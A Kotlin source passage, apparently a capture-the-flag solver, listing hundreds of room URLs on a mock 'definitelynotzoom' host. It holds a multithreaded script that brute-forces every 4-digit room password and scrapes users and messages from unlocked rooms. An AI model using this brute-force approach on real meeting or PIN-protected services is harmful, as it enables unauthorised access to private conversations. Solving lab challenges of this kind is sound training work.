        "http://definitelynotzoom.cybernetic.fish/room/23-46-34",
        "http://definitelynotzoom.cybernetic.fish/room/25-47-74",
        "http://definitelynotzoom.cybernetic.fish/room/82-47-36",
        "http://definitelynotzoom.cybernetic.fish/room/54-47-90",
        "http://definitelynotzoom.cybernetic.fish/room/69-48-33",
        "http://definitelynotzoom.cybernetic.fish/room/26-48-44",
        "http://definitelynotzoom.cybernetic.fish/room/84-48-76",
        "http://definitelynotzoom.cybernetic.fish/room/55-48-60",
        "http://definitelynotzoom.cybernetic.fish/room/12-48-71",
        "http://definitelynotzoom.cybernetic.fish/room/97-47-79",
        "http://definitelynotzoom.cybernetic.fish/room/70-49-03",
        "http://definitelynotzoom.cybernetic.fish/room/56-49-30",
        "http://definitelynotzoom.cybernetic.fish/room/98-48-49",
        "http://definitelynotzoom.cybernetic.fish/room/27-49-14",
        "http://definitelynotzoom.cybernetic.fish/room/41-48-87",
        "http://definitelynotzoom.cybernetic.fish/room/99-49-19",
        "http://definitelynotzoom.cybernetic.fish/room/13-49-41",
        "http://definitelynotzoom.cybernetic.fish/room/28-49-84",
        "http://definitelynotzoom.cybernetic.fish/room/85-49-46",
        "http://definitelynotzoom.cybernetic.fish/room/57-50-00",
        "http://definitelynotzoom.cybernetic.fish/room/72-50-43",
        "http://definitelynotzoom.cybernetic.fish/room/44-50-97",
        "http://definitelynotzoom.cybernetic.fish/room/15-50-81",
        "http://definitelynotzoom.cybernetic.fish/room/87-50-86",
        "http://definitelynotzoom.cybernetic.fish/room/00-50-38",
        "http://definitelynotzoom.cybernetic.fish/room/16-51-51",
        "http://definitelynotzoom.cybernetic.fish/room/29-50-54",
        "http://definitelynotzoom.cybernetic.fish/room/01-51-08",
        "http://definitelynotzoom.cybernetic.fish/room/58-50-70",
        "http://definitelynotzoom.cybernetic.fish/room/30-51-24",
        "http://definitelynotzoom.cybernetic.fish/room/88-51-56",
        "http://definitelynotzoom.cybernetic.fish/room/31-51-94",
        "http://definitelynotzoom.cybernetic.fish/room/59-51-40",
        "http://definitelynotzoom.cybernetic.fish/room/73-51-13",
        "http://definitelynotzoom.cybernetic.fish/room/60-52-10",
        "http://definitelynotzoom.cybernetic.fish/room/32-52-64",
        "http://definitelynotzoom.cybernetic.fish/room/03-52-48",
        "http://definitelynotzoom.cybernetic.fish/room/33-53-34",
        "http://definitelynotzoom.cybernetic.fish/room/75-52-53",
        "http://definitelynotzoom.cybernetic.fish/room/47-53-07",
        "http://definitelynotzoom.cybernetic.fish/room/77-53-93",
        "http://definitelynotzoom.cybernetic.fish/room/76-53-23",
        "http://definitelynotzoom.cybernetic.fish/room/91-53-66",
        "http://definitelynotzoom.cybernetic.fish/room/18-52-91",
        "http://definitelynotzoom.cybernetic.fish/room/19-53-61",
        "http://definitelynotzoom.cybernetic.fish/room/48-53-77",
        "http://definitelynotzoom.cybernetic.fish/room/63-54-20",
        "http://definitelynotzoom.cybernetic.fish/room/04-53-18",
        "http://definitelynotzoom.cybernetic.fish/room/34-54-04",
        "http://definitelynotzoom.cybernetic.fish/room/62-53-50",
        "http://definitelynotzoom.cybernetic.fish/room/36-55-44",
        "http://definitelynotzoom.cybernetic.fish/room/06-54-58",
        "http://definitelynotzoom.cybernetic.fish/room/21-55-01",
        "http://definitelynotzoom.cybernetic.fish/room/78-54-63",
        "http://definitelynotzoom.cybernetic.fish/room/50-55-17",
        "http://definitelynotzoom.cybernetic.fish/room/94-55-76",
        "http://definitelynotzoom.cybernetic.fish/room/35-54-74",
        "http://definitelynotzoom.cybernetic.fish/room/51-55-87",
        "http://definitelynotzoom.cybernetic.fish/room/07-55-28",
        "http://definitelynotzoom.cybernetic.fish/room/79-55-33",
        "http://definitelynotzoom.cybernetic.fish/room/65-55-60",
        "http://definitelynotzoom.cybernetic.fish/room/22-55-71",
        "http://definitelynotzoom.cybernetic.fish/room/66-56-30",
        "http://definitelynotzoom.cybernetic.fish/room/80-56-03",
        "http://definitelynotzoom.cybernetic.fish/room/09-56-68",
        "http://definitelynotzoom.cybernetic.fish/room/24-57-11",
        "http://definitelynotzoom.cybernetic.fish/room/10-57-38",
        "http://definitelynotzoom.cybernetic.fish/room/81-56-73",
        "http://definitelynotzoom.cybernetic.fish/room/37-56-14",
        "http://definitelynotzoom.cybernetic.fish/room/38-56-84",
        "http://definitelynotzoom.cybernetic.fish/room/53-57-27",
        "http://definitelynotzoom.cybernetic.fish/room/39-57-54",
        "http://definitelynotzoom.cybernetic.fish/room/25-57-81",
        "http://definitelynotzoom.cybernetic.fish/room/83-58-13",
        "http://definitelynotzoom.cybernetic.fish/room/82-57-43",
        "http://definitelynotzoom.cybernetic.fish/room/11-58-08",
        "http://definitelynotzoom.cybernetic.fish/room/54-57-97",
        "http://definitelynotzoom.cybernetic.fish/room/40-58-24",
        "http://definitelynotzoom.cybernetic.fish/room/68-57-70",
        "http://definitelynotzoom.cybernetic.fish/room/69-58-40",
        "http://definitelynotzoom.cybernetic.fish/room/97-57-86",
        "http://definitelynotzoom.cybernetic.fish/room/84-58-83",
        "http://definitelynotzoom.cybernetic.fish/room/12-58-78",
        "http://definitelynotzoom.cybernetic.fish/room/98-58-56",
        "http://definitelynotzoom.cybernetic.fish/room/56-59-37",
        "http://definitelynotzoom.cybernetic.fish/room/41-58-94",
        "http://definitelynotzoom.cybernetic.fish/room/42-59-64",
        "http://definitelynotzoom.cybernetic.fish/room/13-59-48",
        "http://definitelynotzoom.cybernetic.fish/room/28-59-91",
        "http://definitelynotzoom.cybernetic.fish/room/71-59-80",
        "http://definitelynotzoom.cybernetic.fish/room/43-60-34",
        "http://definitelynotzoom.cybernetic.fish/room/85-59-53",
        "http://definitelynotzoom.cybernetic.fish/room/72-60-50",
        "http://definitelynotzoom.cybernetic.fish/room/57-60-07",
        "http://definitelynotzoom.cybernetic.fish/room/14-60-18",
        "http://definitelynotzoom.cybernetic.fish/room/86-60-23",
        "http://definitelynotzoom.cybernetic.fish/room/00-60-45",
        "http://definitelynotzoom.cybernetic.fish/room/45-61-74",
        "http://definitelynotzoom.cybernetic.fish/room/44-61-04",
        "http://definitelynotzoom.cybernetic.fish/room/15-60-88",
        "http://definitelynotzoom.cybernetic.fish/room/16-61-58",
        "http://definitelynotzoom.cybernetic.fish/room/87-60-93",
        "http://definitelynotzoom.cybernetic.fish/room/88-61-63",
        "http://definitelynotzoom.cybernetic.fish/room/31-62-01",
        "http://definitelynotzoom.cybernetic.fish/room/74-61-90",
        "http://definitelynotzoom.cybernetic.fish/room/59-61-47",
        "http://definitelynotzoom.cybernetic.fish/room/89-62-33",
        "http://definitelynotzoom.cybernetic.fish/room/17-62-28",
        "http://definitelynotzoom.cybernetic.fish/room/60-62-17",
        "http://definitelynotzoom.cybernetic.fish/room/03-62-55",
        "http://definitelynotzoom.cybernetic.fish/room/46-62-44",
        "http://definitelynotzoom.cybernetic.fish/room/02-61-85",
        "http://definitelynotzoom.cybernetic.fish/room/75-62-60",
        "http://definitelynotzoom.cybernetic.fish/room/47-63-14",
        "http://definitelynotzoom.cybernetic.fish/room/63-64-27",
        "http://definitelynotzoom.cybernetic.fish/room/91-63-73",
        "http://definitelynotzoom.cybernetic.fish/room/18-62-98",
        "http://definitelynotzoom.cybernetic.fish/room/05-63-95",
        "http://definitelynotzoom.cybernetic.fish/room/90-63-03",
        "http://definitelynotzoom.cybernetic.fish/room/19-63-68",
        "http://definitelynotzoom.cybernetic.fish/room/34-64-11",
        "http://definitelynotzoom.cybernetic.fish/room/62-63-57",
        "http://definitelynotzoom.cybernetic.fish/room/64-64-97",
        "http://definitelynotzoom.cybernetic.fish/room/20-64-38",
        "http://definitelynotzoom.cybernetic.fish/room/49-64-54",
        "http://definitelynotzoom.cybernetic.fish/room/92-64-43",
        "http://definitelynotzoom.cybernetic.fish/room/06-64-65",
        "http://definitelynotzoom.cybernetic.fish/room/50-65-24",
        "http://definitelynotzoom.cybernetic.fish/room/21-65-08",
        "http://definitelynotzoom.cybernetic.fish/room/78-64-70",
        "http://definitelynotzoom.cybernetic.fish/room/35-64-81",
        "http://definitelynotzoom.cybernetic.fish/room/94-65-83",
        "http://definitelynotzoom.cybernetic.fish/room/93-65-13",
        "http://definitelynotzoom.cybernetic.fish/room/65-65-67",
        "http://definitelynotzoom.cybernetic.fish/room/22-65-78",
        "http://definitelynotzoom.cybernetic.fish/room/52-66-64",
        "http://definitelynotzoom.cybernetic.fish/room/95-66-53",
        "http://definitelynotzoom.cybernetic.fish/room/66-66-37",
        "http://definitelynotzoom.cybernetic.fish/room/08-66-05",
        "http://definitelynotzoom.cybernetic.fish/room/24-67-18",
        "http://definitelynotzoom.cybernetic.fish/room/09-66-75",
        "http://definitelynotzoom.cybernetic.fish/room/38-66-91",
        "http://definitelynotzoom.cybernetic.fish/room/67-67-07",
        "http://definitelynotzoom.cybernetic.fish/room/37-66-21",
        "http://definitelynotzoom.cybernetic.fish/room/53-67-34",
        "http://definitelynotzoom.cybernetic.fish/room/96-67-23",
        "http://definitelynotzoom.cybernetic.fish/room/81-66-80",
        "http://definitelynotzoom.cybernetic.fish/room/25-67-88",
        "http://definitelynotzoom.cybernetic.fish/room/23-66-48",
        "http://definitelynotzoom.cybernetic.fish/room/11-68-15",
        "http://definitelynotzoom.cybernetic.fish/room/40-68-31",
        "http://definitelynotzoom.cybernetic.fish/room/68-67-77",
        "http://definitelynotzoom.cybernetic.fish/room/55-68-74",
        "http://definitelynotzoom.cybernetic.fish/room/69-68-47",
        "http://definitelynotzoom.cybernetic.fish/room/26-68-58",
        "http://definitelynotzoom.cybernetic.fish/room/84-68-90",
        "http://definitelynotzoom.cybernetic.fish/room/70-69-17",
        "http://definitelynotzoom.cybernetic.fish/room/97-67-93",
        "http://definitelynotzoom.cybernetic.fish/room/12-68-85",
        "http://definitelynotzoom.cybernetic.fish/room/98-68-63",
        "http://definitelynotzoom.cybernetic.fish/room/56-69-44",
        "http://definitelynotzoom.cybernetic.fish/room/41-69-01",
        "http://definitelynotzoom.cybernetic.fish/room/99-69-33",
        "http://definitelynotzoom.cybernetic.fish/room/27-69-28",
        "http://definitelynotzoom.cybernetic.fish/room/43-70-41",
        "http://definitelynotzoom.cybernetic.fish/room/28-69-98",
        "http://definitelynotzoom.cybernetic.fish/room/85-69-60",
        "http://definitelynotzoom.cybernetic.fish/room/71-69-87",
        "http://definitelynotzoom.cybernetic.fish/room/72-70-57",
        "http://definitelynotzoom.cybernetic.fish/room/00-70-52",
        "http://definitelynotzoom.cybernetic.fish/room/44-71-11",
        "http://definitelynotzoom.cybernetic.fish/room/87-71-00",
        "http://definitelynotzoom.cybernetic.fish/room/88-71-70",
        "http://definitelynotzoom.cybernetic.fish/room/15-70-95",
        "http://definitelynotzoom.cybernetic.fish/room/30-71-38",
        "http://definitelynotzoom.cybernetic.fish/room/29-70-68",
        "http://definitelynotzoom.cybernetic.fish/room/31-72-08",
        "http://definitelynotzoom.cybernetic.fish/room/01-71-22",
        "http://definitelynotzoom.cybernetic.fish/room/58-70-84",
        "http://definitelynotzoom.cybernetic.fish/room/74-71-97",
        "http://definitelynotzoom.cybernetic.fish/room/59-71-54",
        "http://definitelynotzoom.cybernetic.fish/room/73-71-27",
        "http://definitelynotzoom.cybernetic.fish/room/03-72-62",
        "http://definitelynotzoom.cybernetic.fish/room/02-71-92",
        "http://definitelynotzoom.cybernetic.fish/room/61-72-94",
        "http://definitelynotzoom.cybernetic.fish/room/32-72-78",
        "http://definitelynotzoom.cybernetic.fish/room/46-72-51",
        "http://definitelynotzoom.cybernetic.fish/room/33-73-48",
        "http://definitelynotzoom.cybernetic.fish/room/47-73-21",
        "http://definitelynotzoom.cybernetic.fish/room/75-72-67",
        "http://definitelynotzoom.cybernetic.fish/room/77-74-07",
        "http://definitelynotzoom.cybernetic.fish/room/18-73-05",
        "http://definitelynotzoom.cybernetic.fish/room/91-73-80",
        "http://definitelynotzoom.cybernetic.fish/room/04-73-32",
        "http://definitelynotzoom.cybernetic.fish/room/76-73-37",
        "http://definitelynotzoom.cybernetic.fish/room/90-73-10",
        "http://definitelynotzoom.cybernetic.fish/room/05-74-02",
        "http://definitelynotzoom.cybernetic.fish/room/34-74-18",
        "http://definitelynotzoom.cybernetic.fish/room/62-73-64",
        "http://definitelynotzoom.cybernetic.fish/room/36-75-58",
        "http://definitelynotzoom.cybernetic.fish/room/06-74-72",
        "http://definitelynotzoom.cybernetic.fish/room/49-74-61",
        "http://definitelynotzoom.cybernetic.fish/room/50-75-31",
        "http://definitelynotzoom.cybernetic.fish/room/21-75-15",
        "http://definitelynotzoom.cybernetic.fish/room/78-74-77",
        "http://definitelynotzoom.cybernetic.fish/room/93-75-20",
        "http://definitelynotzoom.cybernetic.fish/room/94-75-90",
        "http://definitelynotzoom.cybernetic.fish/room/07-75-42",
        "http://definitelynotzoom.cybernetic.fish/room/51-76-01",
        "http://definitelynotzoom.cybernetic.fish/room/79-75-47",
        "http://definitelynotzoom.cybernetic.fish/room/65-75-74",
        "http://definitelynotzoom.cybernetic.fish/room/22-75-85",
        "http://definitelynotzoom.cybernetic.fish/room/52-76-71",
        "http://definitelynotzoom.cybernetic.fish/room/08-76-12",
        "http://definitelynotzoom.cybernetic.fish/room/24-77-25",
        "http://definitelynotzoom.cybernetic.fish/room/09-76-82",
        "http://definitelynotzoom.cybernetic.fish/room/80-76-17",
        "http://definitelynotzoom.cybernetic.fish/room/10-77-52",
        "http://definitelynotzoom.cybernetic.fish/room/37-76-28",
        "http://definitelynotzoom.cybernetic.fish/room/53-77-41",
        "http://definitelynotzoom.cybernetic.fish/room/96-77-30",
        "http://definitelynotzoom.cybernetic.fish/room/81-76-87",
        "http://definitelynotzoom.cybernetic.fish/room/39-77-68",
        "http://definitelynotzoom.cybernetic.fish/room/83-78-27",
        "http://definitelynotzoom.cybernetic.fish/room/25-77-95",
        "http://definitelynotzoom.cybernetic.fish/room/54-78-11",
        "http://definitelynotzoom.cybernetic.fish/room/82-77-57",
        "http://definitelynotzoom.cybernetic.fish/room/11-78-22",
        "http://definitelynotzoom.cybernetic.fish/room/68-77-84",
        "http://definitelynotzoom.cybernetic.fish/room/55-78-81",
        "http://definitelynotzoom.cybernetic.fish/room/40-78-38",
        "http://definitelynotzoom.cybernetic.fish/room/84-78-97",
        "http://definitelynotzoom.cybernetic.fish/room/97-78-00",
        "http://definitelynotzoom.cybernetic.fish/room/12-78-92",
        "http://definitelynotzoom.cybernetic.fish/room/56-79-51",
        "http://definitelynotzoom.cybernetic.fish/room/99-79-40",
        "http://definitelynotzoom.cybernetic.fish/room/27-79-35",
        "http://definitelynotzoom.cybernetic.fish/room/42-79-78",
        "http://definitelynotzoom.cybernetic.fish/room/13-79-62",
        "http://definitelynotzoom.cybernetic.fish/room/43-80-48",
        "http://definitelynotzoom.cybernetic.fish/room/28-80-05",
        "http://definitelynotzoom.cybernetic.fish/room/71-79-94",
        "http://definitelynotzoom.cybernetic.fish/room/85-79-67",
        "http://definitelynotzoom.cybernetic.fish/room/72-80-64",
        "http://definitelynotzoom.cybernetic.fish/room/14-80-32",
        "http://definitelynotzoom.cybernetic.fish/room/57-80-21",
        "http://definitelynotzoom.cybernetic.fish/room/87-81-07",
        "http://definitelynotzoom.cybernetic.fish/room/86-80-37",
        "http://definitelynotzoom.cybernetic.fish/room/45-81-88",
        "http://definitelynotzoom.cybernetic.fish/room/15-81-02",
        "http://definitelynotzoom.cybernetic.fish/room/16-81-72",
        "http://definitelynotzoom.cybernetic.fish/room/30-81-45",
        "http://definitelynotzoom.cybernetic.fish/room/58-80-91",
        "http://definitelynotzoom.cybernetic.fish/room/31-82-15",
        "http://definitelynotzoom.cybernetic.fish/room/74-82-04",
        "http://definitelynotzoom.cybernetic.fish/room/59-81-61",
        "http://definitelynotzoom.cybernetic.fish/room/89-82-47",
        "http://definitelynotzoom.cybernetic.fish/room/60-82-31",
        "http://definitelynotzoom.cybernetic.fish/room/02-81-99",
        "http://definitelynotzoom.cybernetic.fish/room/17-82-42",
        "http://definitelynotzoom.cybernetic.fish/room/46-82-58",
        "http://definitelynotzoom.cybernetic.fish/room/33-83-55",
        "http://definitelynotzoom.cybernetic.fish/room/61-83-01",
        "http://definitelynotzoom.cybernetic.fish/room/77-84-14",
        "http://definitelynotzoom.cybernetic.fish/room/63-84-41",
        "http://definitelynotzoom.cybernetic.fish/room/75-82-74",
        "http://definitelynotzoom.cybernetic.fish/room/18-83-12",
        "http://definitelynotzoom.cybernetic.fish/room/48-83-98",
        "http://definitelynotzoom.cybernetic.fish/room/19-83-82",
        "http://definitelynotzoom.cybernetic.fish/room/20-84-52",
        "http://definitelynotzoom.cybernetic.fish/room/64-85-11",
        "http://definitelynotzoom.cybernetic.fish/room/90-83-17",
        "http://definitelynotzoom.cybernetic.fish/room/62-83-71",
        "http://definitelynotzoom.cybernetic.fish/room/05-84-09",
        "http://definitelynotzoom.cybernetic.fish/room/34-84-25",
        "http://definitelynotzoom.cybernetic.fish/room/36-85-65",
        "http://definitelynotzoom.cybernetic.fish/room/49-84-68",
        "http://definitelynotzoom.cybernetic.fish/room/21-85-22",
        "http://definitelynotzoom.cybernetic.fish/room/92-84-57",
        "http://definitelynotzoom.cybernetic.fish/room/93-85-27",
        "http://definitelynotzoom.cybernetic.fish/room/78-84-84",
        "http://definitelynotzoom.cybernetic.fish/room/65-85-81",
        "http://definitelynotzoom.cybernetic.fish/room/66-86-51",
        "http://definitelynotzoom.cybernetic.fish/room/95-86-67",
        "http://definitelynotzoom.cybernetic.fish/room/52-86-78",
        "http://definitelynotzoom.cybernetic.fish/room/08-86-19",
        "http://definitelynotzoom.cybernetic.fish/room/24-87-32",
        "http://definitelynotzoom.cybernetic.fish/room/80-86-24",
        "http://definitelynotzoom.cybernetic.fish/room/38-87-05",
        "http://definitelynotzoom.cybernetic.fish/room/09-86-89",
        "http://definitelynotzoom.cybernetic.fish/room/37-86-35",
        "http://definitelynotzoom.cybernetic.fish/room/67-87-21",
        "http://definitelynotzoom.cybernetic.fish/room/83-88-34",
        "http://definitelynotzoom.cybernetic.fish/room/96-87-37",
        "http://definitelynotzoom.cybernetic.fish/room/81-86-94",
        "http://definitelynotzoom.cybernetic.fish/room/23-86-62",
        "http://definitelynotzoom.cybernetic.fish/room/39-87-75",
        "http://definitelynotzoom.cybernetic.fish/room/11-88-29",
        "http://definitelynotzoom.cybernetic.fish/room/68-87-91",
        "http://definitelynotzoom.cybernetic.fish/room/69-88-61",
        "http://definitelynotzoom.cybernetic.fish/room/55-88-88",
        "http://definitelynotzoom.cybernetic.fish/room/26-88-72",
        "http://definitelynotzoom.cybernetic.fish/room/40-88-45",
        "http://definitelynotzoom.cybernetic.fish/room/84-89-04",
        "http://definitelynotzoom.cybernetic.fish/room/70-89-31",
        "http://definitelynotzoom.cybernetic.fish/room/41-89-15",
        "http://definitelynotzoom.cybernetic.fish/room/12-88-99",
        "http://definitelynotzoom.cybernetic.fish/room/98-88-77",
        "http://definitelynotzoom.cybernetic.fish/room/99-89-47",
        "http://definitelynotzoom.cybernetic.fish/room/27-89-42",
        "http://definitelynotzoom.cybernetic.fish/room/42-89-85",
        "http://definitelynotzoom.cybernetic.fish/room/43-90-55",
        "http://definitelynotzoom.cybernetic.fish/room/71-90-01",
        "http://definitelynotzoom.cybernetic.fish/room/44-91-25",
        "http://definitelynotzoom.cybernetic.fish/room/14-90-39",
        "http://definitelynotzoom.cybernetic.fish/room/72-90-71",
        "http://definitelynotzoom.cybernetic.fish/room/86-90-44",
        "http://definitelynotzoom.cybernetic.fish/room/45-91-95",
        "http://definitelynotzoom.cybernetic.fish/room/00-90-66",
        "http://definitelynotzoom.cybernetic.fish/room/87-91-14",
        "http://definitelynotzoom.cybernetic.fish/room/88-91-84",
        "http://definitelynotzoom.cybernetic.fish/room/30-91-52",
        "http://definitelynotzoom.cybernetic.fish/room/29-90-82",
        "http://definitelynotzoom.cybernetic.fish/room/15-91-09",
        "http://definitelynotzoom.cybernetic.fish/room/58-90-98",
        "http://definitelynotzoom.cybernetic.fish/room/01-91-36",
        "http://definitelynotzoom.cybernetic.fish/room/74-92-11",
        "http://definitelynotzoom.cybernetic.fish/room/59-91-68",
        "http://definitelynotzoom.cybernetic.fish/room/73-91-41",
        "http://definitelynotzoom.cybernetic.fish/room/32-92-92",
        "http://definitelynotzoom.cybernetic.fish/room/02-92-06",
        "http://definitelynotzoom.cybernetic.fish/room/89-92-54",
        "http://definitelynotzoom.cybernetic.fish/room/03-92-76",
        "http://definitelynotzoom.cybernetic.fish/room/17-92-49",
        "http://definitelynotzoom.cybernetic.fish/room/33-93-62",
        "http://definitelynotzoom.cybernetic.fish/room/46-92-65",
        "http://definitelynotzoom.cybernetic.fish/room/61-93-08",
        "http://definitelynotzoom.cybernetic.fish/room/47-93-35",
        "http://definitelynotzoom.cybernetic.fish/room/18-93-19",
        "http://definitelynotzoom.cybernetic.fish/room/04-93-46",
        "http://definitelynotzoom.cybernetic.fish/room/91-93-94",
        "http://definitelynotzoom.cybernetic.fish/room/77-94-21",
        "http://definitelynotzoom.cybernetic.fish/room/48-94-05",
        "http://definitelynotzoom.cybernetic.fish/room/76-93-51",
        "http://definitelynotzoom.cybernetic.fish/room/90-93-24",
        "http://definitelynotzoom.cybernetic.fish/room/20-94-59",
        "http://definitelynotzoom.cybernetic.fish/room/64-95-18",
        "http://definitelynotzoom.cybernetic.fish/room/62-93-78",
        "http://definitelynotzoom.cybernetic.fish/room/05-94-16",
        "http://definitelynotzoom.cybernetic.fish/room/49-94-75",
        "http://definitelynotzoom.cybernetic.fish/room/50-95-45",
        "http://definitelynotzoom.cybernetic.fish/room/06-94-86",
        "http://definitelynotzoom.cybernetic.fish/room/36-95-72",
        "http://definitelynotzoom.cybernetic.fish/room/21-95-29",
        "http://definitelynotzoom.cybernetic.fish/room/92-94-64",
        "http://definitelynotzoom.cybernetic.fish/room/93-95-34",
        "http://definitelynotzoom.cybernetic.fish/room/35-95-02",
        "http://definitelynotzoom.cybernetic.fish/room/94-96-04",
        "http://definitelynotzoom.cybernetic.fish/room/51-96-15",
        "http://definitelynotzoom.cybernetic.fish/room/07-95-56",
        "http://definitelynotzoom.cybernetic.fish/room/79-95-61",
        "http://definitelynotzoom.cybernetic.fish/room/65-95-88",
        "http://definitelynotzoom.cybernetic.fish/room/95-96-74",
        "http://definitelynotzoom.cybernetic.fish/room/52-96-85",
        "http://definitelynotzoom.cybernetic.fish/room/08-96-26",
        "http://definitelynotzoom.cybernetic.fish/room/80-96-31",
        "http://definitelynotzoom.cybernetic.fish/room/24-97-39",
        "http://definitelynotzoom.cybernetic.fish/room/67-97-28",
        "http://definitelynotzoom.cybernetic.fish/room/10-97-66",
        "http://definitelynotzoom.cybernetic.fish/room/83-98-41",
        "http://definitelynotzoom.cybernetic.fish/room/25-98-09",
        "http://definitelynotzoom.cybernetic.fish/room/53-97-55",
        "http://definitelynotzoom.cybernetic.fish/room/96-97-44",
        "http://definitelynotzoom.cybernetic.fish/room/23-96-69",
        "http://definitelynotzoom.cybernetic.fish/room/54-98-25",
        "http://definitelynotzoom.cybernetic.fish/room/39-97-82",
        "http://definitelynotzoom.cybernetic.fish/room/11-98-36",
        "http://definitelynotzoom.cybernetic.fish/room/68-97-98",
        "http://definitelynotzoom.cybernetic.fish/room/70-99-38",
        "http://definitelynotzoom.cybernetic.fish/room/82-97-71",
        "http://definitelynotzoom.cybernetic.fish/room/55-98-95",
        "http://definitelynotzoom.cybernetic.fish/room/97-98-14",
        "http://definitelynotzoom.cybernetic.fish/room/26-98-79",
        "http://definitelynotzoom.cybernetic.fish/room/56-99-65",
        "http://definitelynotzoom.cybernetic.fish/room/98-98-84",
        "http://definitelynotzoom.cybernetic.fish/room/99-99-54",
        "http://definitelynotzoom.cybernetic.fish/room/27-99-49",
        "http://definitelynotzoom.cybernetic.fish/room/42-99-92",
        "http://definitelynotzoom.cybernetic.fish/room/13-99-76",
        "http://definitelynotzoom.cybernetic.fish/room/85-99-81"
        )

        val toVisitReal = LinkedList<String>()
        toVisitReal.addAll(toVisit)


        fun tryCode(url: String, code: Int): String {
            while (true) {
                try {
                    val urlParameters = String.format("room_password=%04d", code)
                    val postData = urlParameters.toByteArray()
                    val postDataLength = postData.size
                    val conn = URL(url).openConnection() as HttpURLConnection
                    conn.doOutput = true
                    conn.instanceFollowRedirects = false
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                    conn.setRequestProperty("charset", "utf-8")
                    conn.setRequestProperty("Content-Length", Integer.toString(postDataLength))
                    conn.useCaches = false
                    DataOutputStream(conn.outputStream).use({ wr -> wr.write(postData) })

                    val result = StringBuilder()
                    val rd = BufferedReader(InputStreamReader(conn.getInputStream()))
                    var line: String?
                    while (true) {
                        line = rd.readLine()
                        if (line == null) break
                        result.append(line)
                    }
                    rd.close()

                    return result.toString()
                } catch (e: Exception) {
                    if (e is InterruptedException) return ""
                    else System.err.println("Retrying... $url. ${e.javaClass}")
                }
            }
        }

        var curJob: Disposable? = null

        val users = mutableSetOf<String>()
        val messages = mutableSetOf<String>()
        var done = 0

        while(toVisitReal.isNotEmpty()) {
            val cdl = CountDownLatch(1)
            val baseUrl = toVisitReal.pop()
            var foundCode = false

            curJob = Observable.create<List<Int>> {
                val threads = 100
                val chunkSize = 10000 / threads
                for (c in 0 until threads) {
                    val l = mutableListOf<Int>()
                    for (i in (c * chunkSize) until (c + 1) * chunkSize) {
                        l.add(i)
                    }

                    it.onNext(l)
                }
                it.onComplete()
            }.flatMap {
                Observable.create<Void> { emitter ->
                    for (i in it) {
                        if (emitter.isDisposed) break
                        val result = tryCode(baseUrl, i)
                        if (!result.contains("Incorrect password")) {
                            done++
                            println("Url: $baseUrl Passcode: $i Progress $done / ${toVisit.size}")
                            if (result.contains("flag")) {
                                println("FOUND SOMETHING ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ $baseUrl $i")
                            }
                            val parsed = parseHtml(result)
                            parsed.forEach {
                                if (users.add(it.first)) {
                                    println("Use user! ${it.first}")
                                }
                                if (messages.add(it.second)) {
                                    println("Use message! ${it.second}")
                                }
                            }
                            if (parsed.isEmpty()) {
                                println("I Found something weird? $baseUrl $i")
                            }
                            foundCode = true
                            cdl.countDown()
                            curJob?.dispose()
                        }
                    }
                    emitter.onComplete()
                }.subscribeOn(Schedulers.io())
            }.subscribeOn(Schedulers.io())
                    .subscribe({}, {
                        it.printStackTrace()
                        cdl.countDown()
                    }, {
                        cdl.countDown()
                    })

            cdl.await()

            if (!foundCode) {
                println("Unable to find code for $baseUrl @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
            }
        }
    }
}